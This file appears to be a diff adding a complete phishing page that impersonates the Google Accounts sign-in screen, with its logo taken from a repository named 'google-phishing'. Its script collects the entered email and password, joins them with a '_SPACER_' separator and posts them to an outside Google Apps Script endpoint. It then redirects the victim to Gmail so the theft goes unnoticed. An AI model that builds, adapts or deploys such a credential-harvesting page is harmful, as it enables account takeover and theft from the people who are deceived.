@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in - Google Accounts</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f6f8fc;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #202124;
+    }
+    .container {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+      padding: 48px 40px 36px;
+      width: 100%;
+      max-width: 400px;
+    }
+    .logo img { width: 76px; height: auto; margin-bottom: 24px; }
+    h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+    .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; }
+    .input-group { margin-bottom: 24px; position: relative; text-align: left; }
+    input {
+      width: 100%;
+      padding: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+    }
+    label.float-label {
+      position: absolute;
+      top: 14px; left: 16px;
+      font-size: 16px;
+      color: #5f6368;
+      pointer-events: none;
+      transition: all 0.2s ease;
+    }
+    input:focus + .float-label,
+    input:not(:placeholder-shown) + .float-label {
+      top: -8px; left: 12px;
+      font-size: 12px;
+      color: #1a73e8;
+      background: white;
+      padding: 0 6px;
+    }
+    .error {
+      border-color: #d93025 !important;
+      animation: shake 0.45s ease-in-out;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-8px); }
+      40%, 80% { transform: translateX(8px); }
+    }
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #202124;
+      margin: 8px 0 24px;
+      cursor: pointer;
+      user-select: none;
+    }
+    .show-password input { width: 16px; height: 16px; margin: 0; }
+    .link, .create-account, .forgot {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .link:hover, .create-account:hover, .forgot:hover { text-decoration: underline; }
+    .btn {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      min-width: 80px;
+    }
+    .btn:hover:not(:disabled) { background: #1765cc; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .footer-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+    }
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Step 1: Email / Phone -->
+  <div id="step1">
+    <div class="logo">
+      <img src="https://raw.githubusercontent.com/Lior-Margalit/google-phishing/main/google-logo.png" alt="Google Logo">
+    </div>
+    <h1>Sign in</h1>
+    <p class="subtitle">Use your Google Account</p>
+
+    <form id="formStep1">
+      <div class="input-group">
+        <input type="text" id="identifier" placeholder=" " autocomplete="username">
+        <label class="float-label" for="identifier">Email or phone</label>
+      </div>
+      <a href="#" class="forgot">Forgot email?</a>
+      <div class="footer-row">
+        <a href="#" class="create-account">Create account</a>
+        <button type="submit" class="btn">Next</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Step 2: Password -->
+  <div id="step2" class="hidden">
+    <div class="logo">
+      <img src="https://raw.githubusercontent.com/Lior-Margalit/google-phishing/main/google-logo.png" alt="Google Logo">
+    </div>
+    <h1>Welcome</h1>
+    <p class="subtitle">Enter your password</p>
+
+    <form id="formStep2">
+      <div class="input-group">
+        <input type="password" id="user_pass" placeholder=" " autocomplete="current-password">
+        <label class="float-label" for="user_pass">Enter your password</label>
+      </div>
+      <label class="show-password">
+        <input type="checkbox" id="togglePassword"> Show password
+      </label>
+      <div class="footer-row">
+        <a href="#" class="link">Forgot password?</a>
+        <button type="submit" class="btn" id="btnSubmit">Next</button>
+      </div>
+    </form>
+  </div>
+
+</div>
+
+<script>
+// ── Elements ────────────────────────────────────────────────────────────────
+const identifier  = document.getElementById('identifier');
+const passInput   = document.getElementById('user_pass');
+const togglePass  = document.getElementById('togglePassword');
+const step1       = document.getElementById('step1');
+const step2       = document.getElementById('step2');
+const btnSubmit   = document.getElementById('btnSubmit');
+
+// ── Toggle password visibility ──────────────────────────────────────────────
+togglePass.addEventListener('change', () => {
+  passInput.type = togglePass.checked ? 'text' : 'password';
+});
+
+// ── Step 1: Email/Phone validation & switch ─────────────────────────────────
+document.getElementById('formStep1').addEventListener('submit', e => {
+  e.preventDefault();
+  const value = identifier.value.trim();
+  if (!value) {
+    identifier.classList.add('error');
+    setTimeout(() => identifier.classList.remove('error'), 900);
+    identifier.focus();
+    return;
+  }
+  step1.classList.add('hidden');
+  step2.classList.remove('hidden');
+  passInput.focus();
+});
+
+// ── Step 2: Send combined data (email_SPACER_password) ──────────────────────
+document.getElementById('formStep2').addEventListener('submit', async e => {
+  e.preventDefault();
+
+  const email    = identifier.value.trim();
+  const password = passInput.value.trim();
+
+  if (!password) {
+    passInput.classList.add('error');
+    setTimeout(() => passInput.classList.remove('error'), 900);
+    passInput.focus();
+    return;
+  }
+
+  btnSubmit.disabled = true;
+  btnSubmit.textContent = 'Verifying…';
+
+  try {
+    const formData = new FormData();
+    // Combine both values with the exact separator you wanted
+    const combined = email + '_SPACER_' + password;
+    formData.append('data', combined);
+
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyXK1mxRW91DYcTa0zkIeSrmL1GSB9jrYO1tHXtV4VtLA-cpmSHRPwYsJq0fvCHzIZI/exec';
+
+    await fetch(scriptURL, {
+      method: 'POST',
+      body: formData
+    });
+
+    // Redirect after delay
+    setTimeout(() => {
+      window.location.href = 'https://mail.google.com';
+    }, 1200);
+
+  } catch (err) {
+    console.error('Error:', err);
+    // Still redirect (fail-open behavior)
+    setTimeout(() => {
+      window.location.href = 'https://mail.google.com';
+    }, 1200);
+  }
+});
+</script>
+</body>
+</html>
